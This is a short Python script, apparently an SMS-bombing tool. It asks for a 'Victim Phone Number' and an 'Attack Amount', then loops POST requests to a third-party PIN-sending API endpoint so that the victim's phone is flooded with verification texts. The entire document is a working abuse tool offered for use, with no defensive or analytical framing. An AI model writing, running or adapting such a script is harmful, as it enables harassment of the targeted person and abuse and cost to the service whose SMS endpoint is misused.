import requests

#POST

myblapi="https://api.meenaclick.com/api/front/sms/send/pin"

nam=str(input(" Victim Phone Number :"))

number={'cell_phone':nam}

amount=int(input(" Victim Attack Amount. : "))

for i in range(amount):
	requests.post(myblapi,data=number)
	print(str(i+1)+" SMS Sent")